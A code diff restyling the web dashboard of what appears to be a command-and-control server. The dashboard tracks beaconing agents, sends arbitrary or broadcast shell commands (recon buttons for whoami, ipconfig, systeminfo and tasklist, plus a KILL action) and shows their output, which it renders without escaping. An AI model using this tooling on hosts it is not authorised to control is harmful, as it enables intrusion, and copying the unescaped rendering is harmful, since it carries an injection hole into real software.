@@ -3,311 +3,209 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C2 MISSION CONTROL // V4</title>
+    <title>C2 Command Center // Operator Suite</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
         :root {
-            --accent: #00ff87;
-            --accent-soft: rgba(0, 255, 135, 0.14);
-            --bg: #070b11;
-            --panel: #0f1622;
-            --panel-2: #101b29;
-            --border: #223043;
-            --text: #d6e4ff;
-            --muted: #8495b3;
-            --danger: #ff5a67;
-            --warn: #ffc857;
+            --bg: #0b1020;
+            --panel: #111930;
+            --panel-2: #151f3a;
+            --text: #e8edff;
+            --muted: #9fb0d4;
+            --accent: #4de0ff;
+            --accent-2: #6dffb5;
+            --danger: #ff5b78;
+            --warn: #ffc658;
+            --line: #2a3a61;
         }
 
         body {
-            background: radial-gradient(circle at top right, #102033 0%, var(--bg) 45%);
+            background: radial-gradient(circle at 5% -10%, #23376d, transparent 30%), radial-gradient(circle at 95% -20%, #17374a, transparent 35%), var(--bg);
             color: var(--text);
-            font-family: 'Inter', 'Segoe UI', Tahoma, sans-serif;
             min-height: 100vh;
-            padding: 1.2rem;
-        }
-
-        .dashboard-shell {
-            max-width: 1680px;
-            margin: 0 auto;
-        }
-
-        .pane {
-            background: linear-gradient(180deg, var(--panel), var(--panel-2));
-            border: 1px solid var(--border);
-            border-radius: 12px;
+            font-family: Inter, Segoe UI, Arial, sans-serif;
             padding: 1rem;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.25);
         }
 
-        .title-neon {
-            color: var(--accent);
-            text-transform: uppercase;
-            font-weight: 800;
-            letter-spacing: 0.04em;
-            text-shadow: 0 0 10px rgba(0, 255, 135, 0.3);
+        .shell { max-width: 1800px; margin: 0 auto; }
+        .panel {
+            background: linear-gradient(180deg, var(--panel), var(--panel-2));
+            border: 1px solid var(--line);
+            border-radius: 14px;
+            padding: 0.9rem;
+            box-shadow: 0 8px 30px rgba(0,0,0,.25);
         }
+
+        .brand { color: var(--accent); font-weight: 800; letter-spacing: .03em; text-transform: uppercase; }
+        .subtle { color: var(--muted); font-size: .8rem; }
 
         .kpi {
-            border: 1px solid var(--border);
+            border: 1px solid var(--line);
             border-radius: 10px;
-            background: #0c1520;
-            padding: 0.7rem 0.9rem;
-            min-width: 140px;
+            background: #0f1730;
+            padding: .55rem .7rem;
+            min-width: 130px;
         }
+        .kpi .lbl { color: var(--muted); font-size: .66rem; text-transform: uppercase; letter-spacing: .08em; }
+        .kpi .val { font-size: 1.15rem; font-weight: 700; }
 
-        .kpi-label {
-            font-size: 0.7rem;
-            color: var(--muted);
-            text-transform: uppercase;
-            letter-spacing: 0.08em;
-        }
+        .grid { display:grid; grid-template-columns: 1.6fr 1fr; gap:1rem; }
+        .table-wrap { border:1px solid var(--line); border-radius:10px; overflow:auto; max-height: 470px; }
+        .table { --bs-table-bg: transparent; --bs-table-color: var(--text); margin:0; font-size:.88rem; }
+        .table th { color: var(--muted); font-size:.7rem; letter-spacing:.08em; position: sticky; top: 0; background:#121c36; z-index:1; }
+        .table td { vertical-align: middle; }
 
-        .kpi-value {
-            font-size: 1.2rem;
-            font-weight: 700;
-        }
+        .chip { border:1px solid var(--line); border-radius:999px; padding:.1rem .45rem; font-size:.66rem; text-transform:uppercase; color: var(--muted); }
+        .chip.windows { color:#77c8ff; border-color:#356e9d; }
+        .chip.linux { color:#89f9ac; border-color:#36844d; }
+        .chip.mac { color:#e0b5ff; border-color:#7e4ea0; }
+        .chip.unknown { color:#ffd889; border-color:#8a6b35; }
 
-        .table-wrap {
-            max-height: 410px;
-            overflow-y: auto;
-            border: 1px solid var(--border);
-            border-radius: 10px;
-        }
-
-        .table {
-            margin: 0;
-            color: var(--text);
-            --bs-table-bg: transparent;
-            --bs-table-hover-bg: rgba(255, 255, 255, 0.03);
-            --bs-table-color: var(--text);
-        }
-
-        .table th {
-            font-size: 0.72rem;
-            color: var(--muted);
-            letter-spacing: 0.06em;
-            position: sticky;
-            top: 0;
-            background: #111a27;
-            z-index: 1;
-        }
-
-        .status-dot {
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            display: inline-block;
-            margin-right: 0.4rem;
-        }
-
-        .status-online { background: var(--accent); box-shadow: 0 0 10px rgba(0, 255, 135, 0.6); }
-        .status-offline { background: var(--danger); }
-        .status-unknown { background: var(--warn); }
-
-        .chip {
-            font-size: 0.65rem;
-            padding: 0.18rem 0.45rem;
-            border-radius: 20px;
-            border: 1px solid var(--border);
-            color: var(--muted);
-            text-transform: uppercase;
-        }
-
-        .chip.windows { color: #4bb2ff; border-color: #2f73a3; }
-        .chip.linux { color: #a6ff72; border-color: #4f8136; }
-        .chip.unknown { color: #ffd66a; border-color: #8c6f24; }
-
-        .btn-action {
-            background: transparent;
-            border: 1px solid #41556f;
-            color: #b4c4de;
-            font-size: 0.68rem;
-            padding: 0.25rem 0.55rem;
-            border-radius: 6px;
-        }
-
-        .btn-action:hover { border-color: var(--accent); color: var(--accent); }
-        .btn-kill:hover { border-color: var(--danger); color: var(--danger); }
-
-        .target-selected { box-shadow: inset 3px 0 0 var(--accent); background: rgba(0, 255, 135, 0.05) !important; }
+        .dot { width:10px; height:10px; border-radius:50%; display:inline-block; margin-right:.35rem; }
+        .online { background: var(--accent-2); box-shadow: 0 0 10px rgba(109,255,181,.6); }
+        .stale { background: var(--warn); }
+        .offline { background: var(--danger); }
+        .unknown { background: #8c98b8; }
 
         .terminal {
-            background: #06090f;
-            border: 1px solid var(--border);
+            background: #0a1226;
+            border: 1px solid var(--line);
             border-radius: 10px;
-            font-family: 'Consolas', monospace;
-            max-height: 460px;
+            max-height: 390px;
             overflow-y: auto;
-            padding: 0.7rem;
+            font-family: Consolas, monospace;
+            font-size: .82rem;
+            padding: .55rem;
         }
+        .item { border:1px solid #22345b; background:#0d1730; border-radius:8px; padding:.5rem; margin-bottom:.45rem; }
+        .result-out { white-space: pre-wrap; margin: .3rem 0 0; color: #8dffcf; }
+        .selected { box-shadow: inset 3px 0 0 var(--accent); background: rgba(77,224,255,.08) !important; }
 
-        .queue-item, .result-item {
-            border: 1px solid #1b2638;
-            border-radius: 8px;
-            padding: 0.55rem;
-            margin-bottom: 0.55rem;
-            background: #0a1019;
-        }
+        .form-control, .form-select { background:#0d1730; color:var(--text); border-color:#314778; }
+        .form-control:focus, .form-select:focus { border-color:var(--accent); box-shadow:0 0 0 .15rem rgba(77,224,255,.2); background:#0d1730; color:var(--text); }
+        .btn-outline-c2 { border-color:#3f5b91; color:#b7ccf8; }
+        .btn-outline-c2:hover { border-color:var(--accent); color:var(--accent); }
 
-        .result-output {
-            white-space: pre-wrap;
-            color: #7dffb0;
-            font-size: 0.8rem;
-            margin: 0.25rem 0 0;
-        }
+        .chart-box { height:180px; border:1px solid var(--line); border-radius:10px; background:#0d1730; padding:.5rem; }
+        canvas { width:100%; height:100%; }
 
-        .small-label {
-            font-size: 0.7rem;
-            color: var(--muted);
-            text-transform: uppercase;
-            letter-spacing: 0.08em;
-        }
-
-        .form-control, .form-select {
-            background: #0b1320;
-            color: var(--text);
-            border-color: #2d425d;
-        }
-
-        .form-control:focus, .form-select:focus {
-            border-color: var(--accent);
-            box-shadow: 0 0 0 0.15rem var(--accent-soft);
-            background: #0b1320;
-            color: var(--text);
-        }
-
-        @media (max-width: 1200px) {
-            .desktop-grid { display: block !important; }
-            .desktop-grid > * { margin-bottom: 1rem; }
-        }
+        @media (max-width: 1200px) { .grid { grid-template-columns:1fr; } }
     </style>
 </head>
 <body>
-<div class="dashboard-shell">
-    <div class="d-flex justify-content-between align-items-center flex-wrap gap-3 mb-3">
-        <h2 class="title-neon m-0">Strategic Command // Mission Control v4</h2>
+<div class="shell">
+    <div class="d-flex justify-content-between align-items-center flex-wrap gap-2 mb-3">
+        <div>
+            <h3 class="brand m-0">Command Center // Operator Suite</h3>
+            <div class="subtle">Real-time fleet awareness, command dispatch, queue analytics, and execution forensics.</div>
+        </div>
         <div class="d-flex gap-2 flex-wrap">
-            <div class="kpi"><div class="kpi-label">Live Nodes</div><div class="kpi-value" id="agent-count">0</div></div>
-            <div class="kpi"><div class="kpi-label">Windows</div><div class="kpi-value" id="windows-count">0</div></div>
-            <div class="kpi"><div class="kpi-label">Linux</div><div class="kpi-value" id="linux-count">0</div></div>
-            <div class="kpi"><div class="kpi-label">Clock</div><div class="kpi-value" id="clock">00:00:00</div></div>
+            <div class="kpi"><div class="lbl">Online</div><div class="val" id="k-online">0</div></div>
+            <div class="kpi"><div class="lbl">Stale</div><div class="val" id="k-stale">0</div></div>
+            <div class="kpi"><div class="lbl">Offline</div><div class="val" id="k-offline">0</div></div>
+            <div class="kpi"><div class="lbl">Queue</div><div class="val" id="k-queue">0</div></div>
+            <div class="kpi"><div class="lbl">Clock</div><div class="val" id="clock">00:00:00</div></div>
         </div>
     </div>
 
-    <div class="desktop-grid" style="display:grid;grid-template-columns:2.2fr 1fr;gap:1rem;">
-        <div class="pane">
+    <div class="grid">
+        <div class="panel">
             <div class="d-flex justify-content-between align-items-center flex-wrap gap-2 mb-2">
-                <h6 class="small-label m-0">Asset Inventory</h6>
+                <strong>Asset Inventory</strong>
                 <div class="d-flex gap-2 flex-wrap">
-                    <input id="agent-search" class="form-control form-control-sm" placeholder="Search host / OS" style="width:180px;">
-                    <select id="agent-os-filter" class="form-select form-select-sm" style="width:130px;">
-                        <option value="ALL">All OS</option>
-                        <option value="WINDOWS">Windows</option>
-                        <option value="LINUX">Linux</option>
-                        <option value="UNKNOWN">Unknown</option>
+                    <input id="agent-search" class="form-control form-control-sm" placeholder="Search host / os / ip" style="width:190px">
+                    <select id="agent-os-filter" class="form-select form-select-sm" style="width:140px">
+                        <option value="ALL">All OS</option><option value="WINDOWS">Windows</option><option value="LINUX">Linux</option><option value="MAC">Mac</option><option value="UNKNOWN">Unknown</option>
                     </select>
-                    <select id="agent-status-filter" class="form-select form-select-sm" style="width:130px;">
-                        <option value="ALL">All Status</option>
-                        <option value="ONLINE">Online</option>
-                        <option value="OFFLINE">Offline</option>
-                        <option value="UNKNOWN">Unknown</option>
+                    <select id="agent-status-filter" class="form-select form-select-sm" style="width:150px">
+                        <option value="ALL">All Status</option><option value="ONLINE">Online</option><option value="STALE">Stale</option><option value="OFFLINE">Offline</option><option value="UNKNOWN">Unknown</option>
                     </select>
                 </div>
             </div>
             <div class="table-wrap">
                 <table class="table table-hover table-sm align-middle">
-                    <thead><tr><th>HOSTNAME</th><th>OS TAG</th><th>LAST BEACON</th><th>STATUS</th><th>ACTIONS</th></tr></thead>
+                    <thead><tr><th>HOST</th><th>OS</th><th>LAST SEEN</th><th>STATUS</th><th>ACTIONS</th></tr></thead>
                     <tbody id="agent-table"></tbody>
                 </table>
             </div>
         </div>
 
-        <div class="pane">
-            <div class="d-flex justify-content-between align-items-center mb-2">
-                <h6 class="small-label m-0">Operation Queue</h6>
-                <button class="btn btn-sm btn-outline-danger" onclick="purgeQueue()">Clear Queue</button>
+        <div class="d-flex flex-column gap-3">
+            <div class="panel">
+                <div class="d-flex justify-content-between align-items-center mb-2">
+                    <strong>Queue Monitor</strong>
+                    <button class="btn btn-sm btn-outline-danger" onclick="purgeQueue()">Purge</button>
+                </div>
+                <div id="queue-list" class="terminal"></div>
             </div>
-            <div id="queue-list" class="terminal" style="max-height:390px;"></div>
+            <div class="panel">
+                <div class="d-flex justify-content-between align-items-center mb-2"><strong>Fleet Mix</strong><span class="subtle">OS distribution</span></div>
+                <div class="chart-box"><canvas id="os-chart" width="480" height="160"></canvas></div>
+            </div>
         </div>
     </div>
 
-    <div class="pane mt-3">
-        <h6 class="small-label mb-2">Command Uplink</h6>
-        <form id="cmd-form">
-            <div class="row g-2">
+    <div class="panel mt-3">
+        <strong>Command Uplink</strong>
+        <form id="cmd-form" class="mt-2">
+            <div class="row g-2 align-items-center">
                 <div class="col-lg-3">
                     <select name="target" id="target-select" class="form-select">
                         <option value="ALL">Broadcast All</option>
-                        <optgroup label="OS Groups">
-                            <option value="BROADCAST_WINDOWS">Windows All</option>
-                            <option value="BROADCAST_LINUX">Linux All</option>
-                        </optgroup>
+                        <optgroup label="OS Groups"><option value="BROADCAST_WINDOWS">Windows All</option><option value="BROADCAST_LINUX">Linux All</option></optgroup>
                         <optgroup label="Assets" id="opt-assets"></optgroup>
                     </select>
                 </div>
-                <div class="col-lg-7">
-                    <input type="text" name="command" id="cmd-input" class="form-control" placeholder="Awaiting operator command..." required>
-                </div>
-                <div class="col-lg-2 d-grid">
-                    <button class="btn btn-success">Transmit</button>
-                </div>
+                <div class="col-lg-7"><input type="text" name="command" id="cmd-input" class="form-control" placeholder="Type command..." required></div>
+                <div class="col-lg-2 d-grid"><button class="btn btn-success">Transmit</button></div>
+            </div>
+            <div class="d-flex gap-2 mt-2 flex-wrap">
+                <button type="button" class="btn btn-sm btn-outline-c2" onclick="quickCmd('whoami')">whoami</button>
+                <button type="button" class="btn btn-sm btn-outline-c2" onclick="quickCmd('ipconfig || ifconfig')">network</button>
+                <button type="button" class="btn btn-sm btn-outline-c2" onclick="quickCmd('systeminfo || uname -a')">sysinfo</button>
+                <button type="button" class="btn btn-sm btn-outline-c2" onclick="quickCmd('tasklist || ps aux')">processes</button>
             </div>
         </form>
     </div>
 
-    <div class="pane mt-3">
+    <div class="panel mt-3">
         <div class="d-flex justify-content-between align-items-center flex-wrap gap-2 mb-2">
-            <h6 class="small-label m-0">Execution History</h6>
+            <strong>Execution History</strong>
             <div class="d-flex gap-2 flex-wrap">
-                <input id="results-search" class="form-control form-control-sm" placeholder="Search output / host" style="width:210px;">
-                <select id="results-os-filter" class="form-select form-select-sm" style="width:130px;">
-                    <option value="ALL">All OS</option>
-                    <option value="WINDOWS">Windows</option>
-                    <option value="LINUX">Linux</option>
-                    <option value="UNKNOWN">Unknown</option>
+                <input id="results-search" class="form-control form-control-sm" placeholder="Search output / host" style="width:220px">
+                <select id="results-os-filter" class="form-select form-select-sm" style="width:130px">
+                    <option value="ALL">All OS</option><option value="WINDOWS">Windows</option><option value="LINUX">Linux</option><option value="MAC">Mac</option><option value="UNKNOWN">Unknown</option>
                 </select>
-                <select id="results-host-filter" class="form-select form-select-sm" style="width:170px;"><option value="ALL">All Hosts</option></select>
+                <select id="results-host-filter" class="form-select form-select-sm" style="width:180px"><option value="ALL">All Hosts</option></select>
             </div>
         </div>
-        <div id="results-feed" class="terminal"></div>
+        <div id="results-feed" class="terminal" style="max-height:480px"></div>
     </div>
 </div>
 
 <script>
-    const seenResultIds = new Set();
-
     function osChipClass(family) {
         if (family === 'WINDOWS') return 'windows';
         if (family === 'LINUX') return 'linux';
+        if (family === 'MAC') return 'mac';
         return 'unknown';
     }
 
-    function debounce(fn, delay = 300) {
-        let timer;
-        return (...args) => {
-            clearTimeout(timer);
-            timer = setTimeout(() => fn(...args), delay);
-        };
+    function statusClass(status) {
+        if (status === 'ONLINE') return 'online';
+        if (status === 'STALE') return 'stale';
+        if (status === 'OFFLINE') return 'offline';
+        return 'unknown';
     }
 
-    async function triggerAction(hostname, action) {
-        const formData = new FormData();
-        formData.append('hostname', hostname);
-        formData.append('action', action);
-        await fetch('/admin/action', { method: 'POST', body: formData });
-        updateDashboard();
+    function debounce(fn, delay = 260) {
+        let t;
+        return (...args) => { clearTimeout(t); t = setTimeout(() => fn(...args), delay); };
     }
 
-    async function purgeQueue() {
-        await fetch('/admin/purge_tasks', { method: 'POST' });
-        updateDashboard();
-    }
-
-    function selectAgent(hostname) {
-        document.getElementById('target-select').value = hostname;
+    function quickCmd(command) {
+        document.getElementById('cmd-input').value = command;
         document.getElementById('cmd-input').focus();
-        updateDashboard();
     }
 
     function getFilters() {
@@ -318,150 +216,174 @@
             results_search: document.getElementById('results-search').value.trim(),
             results_os: document.getElementById('results-os-filter').value,
             results_host: document.getElementById('results-host-filter').value || 'ALL',
-            results_limit: '200'
+            results_limit: '220'
         };
     }
 
-    function buildQuery(paramsObj) {
+    function queryString(obj) {
         const params = new URLSearchParams();
-        Object.entries(paramsObj).forEach(([k, v]) => {
-            if (v !== undefined && v !== null && v !== '') params.set(k, v);
-        });
+        Object.entries(obj).forEach(([k, v]) => { if (v !== '' && v != null) params.set(k, v); });
         return params.toString();
     }
 
-    function syncResultHosts(hosts) {
-        const hostSelect = document.getElementById('results-host-filter');
-        const prev = hostSelect.value || 'ALL';
-
-        hostSelect.innerHTML = '<option value="ALL">All Hosts</option>';
-        (hosts || []).forEach(host => {
-            const opt = document.createElement('option');
-            opt.value = host;
-            opt.innerText = host;
-            hostSelect.appendChild(opt);
-        });
-
-        if ([...hostSelect.options].some(o => o.value === prev)) hostSelect.value = prev;
+    function selectAgent(hostname) {
+        document.getElementById('target-select').value = hostname;
+        document.getElementById('cmd-input').focus();
+        updateDashboard();
     }
 
-    function renderAgents(data) {
+    async function triggerAction(hostname, action) {
+        const body = new FormData();
+        body.append('hostname', hostname);
+        body.append('action', action);
+        await fetch('/admin/action', { method: 'POST', body });
+        updateDashboard();
+    }
+
+    async function purgeQueue() {
+        await fetch('/admin/purge_tasks', { method: 'POST' });
+        updateDashboard();
+    }
+
+    function drawOsChart(stats) {
+        const canvas = document.getElementById('os-chart');
+        const ctx = canvas.getContext('2d');
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+        const parts = [
+            { label: 'Windows', key: 'windows_agents', color: '#77c8ff' },
+            { label: 'Linux', key: 'linux_agents', color: '#89f9ac' },
+            { label: 'Mac', key: 'mac_agents', color: '#ddb0ff' },
+            { label: 'Unknown', key: 'unknown_agents', color: '#ffd889' },
+        ];
+
+        const total = parts.reduce((sum, p) => sum + (stats[p.key] || 0), 0) || 1;
+        let x = 14;
+        const y = 35;
+        const width = canvas.width - 28;
+        const h = 24;
+
+        parts.forEach(p => {
+            const w = Math.max(0, ((stats[p.key] || 0) / total) * width);
+            ctx.fillStyle = p.color;
+            ctx.fillRect(x, y, w, h);
+            x += w;
+        });
+
+        let ly = 85;
+        ctx.font = '12px Inter';
+        parts.forEach(p => {
+            const count = stats[p.key] || 0;
+            ctx.fillStyle = p.color;
+            ctx.fillRect(16, ly - 9, 10, 10);
+            ctx.fillStyle = '#dbe7ff';
+            ctx.fillText(`${p.label}: ${count}`, 32, ly);
+            ly += 22;
+        });
+    }
+
+    function syncHostFilter(hosts) {
+        const select = document.getElementById('results-host-filter');
+        const prev = select.value || 'ALL';
+        select.innerHTML = '<option value="ALL">All Hosts</option>';
+        (hosts || []).forEach(h => {
+            const o = document.createElement('option');
+            o.value = h;
+            o.textContent = h;
+            select.appendChild(o);
+        });
+        if ([...select.options].some(o => o.value === prev)) select.value = prev;
+    }
+
+    function renderAgents(agents) {
         const table = document.getElementById('agent-table');
-        const optAssets = document.getElementById('opt-assets');
-        const currentTarget = document.getElementById('target-select').value;
-
+        const assets = document.getElementById('opt-assets');
+        const current = document.getElementById('target-select').value;
         table.innerHTML = '';
-        optAssets.innerHTML = '';
+        assets.innerHTML = '';
 
-        if (!data.agents || data.agents.length === 0) {
-            table.innerHTML = '<tr><td colspan="5" class="text-center text-muted py-4">No agents match current filters.</td></tr>';
+        if (!agents.length) {
+            table.innerHTML = '<tr><td colspan="5" class="text-center text-muted py-4">No agents match filters.</td></tr>';
             return;
         }
 
-        data.agents.forEach(agent => {
-            const isSelected = currentTarget === agent.hostname;
-            const statusClass = agent.status === 'ONLINE' ? 'status-online' : (agent.status === 'OFFLINE' ? 'status-offline' : 'status-unknown');
-            const osClass = osChipClass(agent.os_family);
-
+        agents.forEach(a => {
             table.innerHTML += `
-                <tr class="${isSelected ? 'target-selected' : ''}">
-                    <td style="cursor:pointer" onclick="selectAgent('${agent.hostname}')"><strong>${agent.hostname}</strong><div class="text-muted small">${agent.ip || '-'}</div></td>
-                    <td><span class="chip ${osClass}">${agent.os_family}</span><div class="small text-muted">${agent.os}</div></td>
-                    <td><small>${agent.last_seen}</small></td>
-                    <td><span class="status-dot ${statusClass}"></span>${agent.status}</td>
+                <tr class="${current === a.hostname ? 'selected' : ''}">
+                    <td onclick="selectAgent('${a.hostname}')" style="cursor:pointer"><strong>${a.hostname}</strong><div class="subtle">${a.ip || '-'}</div></td>
+                    <td><span class="chip ${osChipClass(a.os_family)}">${a.os_family}</span><div class="subtle">${a.os}</div></td>
+                    <td>${a.last_seen || '--:--:--'}</td>
+                    <td><span class="dot ${statusClass(a.status)}"></span>${a.status}</td>
                     <td>
-                        <button class="btn-action" onclick="triggerAction('${agent.hostname}', 'sysinfo')">INFO</button>
-                        <button class="btn-action" onclick="triggerAction('${agent.hostname}', 'netstat')">NET</button>
-                        <button class="btn-action btn-kill" onclick="triggerAction('${agent.hostname}', 'kill')">KILL</button>
+                        <button class="btn btn-sm btn-outline-c2" onclick="triggerAction('${a.hostname}','whoami')">WHO</button>
+                        <button class="btn btn-sm btn-outline-c2" onclick="triggerAction('${a.hostname}','sysinfo')">INFO</button>
+                        <button class="btn btn-sm btn-outline-c2" onclick="triggerAction('${a.hostname}','netstat')">NET</button>
+                        <button class="btn btn-sm btn-outline-danger" onclick="triggerAction('${a.hostname}','kill')">KILL</button>
                     </td>
                 </tr>`;
-            optAssets.innerHTML += `<option value="${agent.hostname}">${agent.hostname}</option>`;
+            assets.innerHTML += `<option value="${a.hostname}">${a.hostname}</option>`;
         });
     }
 
     function renderQueue(queue) {
-        const qList = document.getElementById('queue-list');
-        if (!queue || queue.length === 0) {
-            qList.innerHTML = '<div class="text-center text-muted py-4">Queue empty.</div>';
+        const el = document.getElementById('queue-list');
+        if (!queue.length) {
+            el.innerHTML = '<div class="text-center text-muted py-4">Queue clear.</div>';
             return;
         }
-
-        qList.innerHTML = '';
+        el.innerHTML = '';
         queue.forEach(t => {
-            const seen = (t.seen_list || []).join(', ') || 'none';
-            qList.innerHTML += `
-                <div class="queue-item small">
-                    <div><span class="text-warning">&gt;</span> ${t.target} <span class="text-muted">@ ${t.timestamp || '--:--:--'}</span></div>
-                    <div class="text-white">${t.command}</div>
-                    <div class="text-muted">Receipts: ${seen}</div>
-                </div>`;
+            const seen = t.seen_list?.length ? t.seen_list.join(', ') : 'none';
+            el.innerHTML += `<div class="item"><div><span class="text-warning">#${t.task_id}</span> ${t.target} <span class="subtle">@ ${t.timestamp}</span></div><div>${t.command}</div><div class="subtle">Receipts: ${t.seen_count} (${seen})</div></div>`;
         });
     }
 
     function renderResults(results) {
-        const resFeed = document.getElementById('results-feed');
-
-        if (!results || results.length === 0) {
-            resFeed.innerHTML = '<div class="text-center text-muted py-4">No execution logs for current filters.</div>';
+        const el = document.getElementById('results-feed');
+        if (!results.length) {
+            el.innerHTML = '<div class="text-center text-muted py-4">No execution logs for selected filters.</div>';
             return;
         }
-
-        resFeed.innerHTML = '';
-        results.forEach(res => {
-            seenResultIds.add(res.id);
-            const osClass = osChipClass(res.os_family);
-            const div = document.createElement('div');
-            div.className = 'result-item';
-            div.innerHTML = `
-                <div class="d-flex justify-content-between align-items-center">
-                    <div>
-                        <strong>${res.hostname}</strong> <span class="chip ${osClass}">${res.os_family}</span>
-                    </div>
-                    <small class="text-muted">${res.timestamp}</small>
-                </div>
-                <pre class="result-output">${res.output}</pre>`;
-            resFeed.appendChild(div);
+        el.innerHTML = '';
+        results.forEach(r => {
+            el.innerHTML += `<div class="item"><div class="d-flex justify-content-between"><div><strong>${r.hostname}</strong> <span class="chip ${osChipClass(r.os_family)}">${r.os_family}</span></div><span class="subtle">${r.timestamp}</span></div><pre class="result-out">${r.output}</pre></div>`;
         });
     }
 
     async function updateDashboard() {
         try {
-            const query = buildQuery(getFilters());
-            const response = await fetch(`/api/stats?${query}`);
-            const data = await response.json();
+            const data = await (await fetch(`/api/stats?${queryString(getFilters())}`)).json();
+            const s = data.stats || {};
 
-            const stats = data.stats || {};
-            document.getElementById('agent-count').innerText = stats.online_agents ?? data.total_count ?? 0;
-            document.getElementById('windows-count').innerText = stats.windows_agents ?? 0;
-            document.getElementById('linux-count').innerText = stats.linux_agents ?? 0;
+            document.getElementById('k-online').textContent = s.online_agents || 0;
+            document.getElementById('k-stale').textContent = s.stale_agents || 0;
+            document.getElementById('k-offline').textContent = s.offline_agents || 0;
+            document.getElementById('k-queue').textContent = s.queue_size || 0;
 
-            syncResultHosts(data.filters?.result_hosts || []);
-            renderAgents(data);
+            syncHostFilter(data.filters?.result_hosts || []);
+            renderAgents(data.agents || []);
             renderQueue(data.queue || []);
             renderResults(data.results || []);
-        } catch (e) {
-            console.error('Dashboard poll failed', e);
+            drawOsChart(s);
+        } catch (err) {
+            console.error('Update failed', err);
         }
     }
 
-    const debouncedRefresh = debounce(updateDashboard, 250);
-    ['agent-search', 'agent-os-filter', 'agent-status-filter', 'results-search', 'results-os-filter', 'results-host-filter']
-        .forEach(id => {
-            document.getElementById(id).addEventListener('input', debouncedRefresh);
-            document.getElementById(id).addEventListener('change', debouncedRefresh);
-        });
+    const refreshDebounced = debounce(updateDashboard, 220);
+    ['agent-search','agent-os-filter','agent-status-filter','results-search','results-os-filter','results-host-filter'].forEach(id => {
+        document.getElementById(id).addEventListener('input', refreshDebounced);
+        document.getElementById(id).addEventListener('change', refreshDebounced);
+    });
 
-    document.getElementById('cmd-form').onsubmit = async (e) => {
+    document.getElementById('cmd-form').addEventListener('submit', async (e) => {
         e.preventDefault();
-        const response = await fetch('/admin/send_cmd', { method: 'POST', body: new FormData(e.target) });
-        if (response.ok) e.target.reset();
+        const res = await fetch('/admin/send_cmd', { method: 'POST', body: new FormData(e.target) });
+        if (res.ok) e.target.reset();
         updateDashboard();
-    };
+    });
 
-    setInterval(() => {
-        document.getElementById('clock').innerText = new Date().toLocaleTimeString();
-    }, 1000);
-
+    setInterval(() => { document.getElementById('clock').textContent = new Date().toLocaleTimeString(); }, 1000);
     setInterval(updateDashboard, 3000);
     updateDashboard();
 </script>
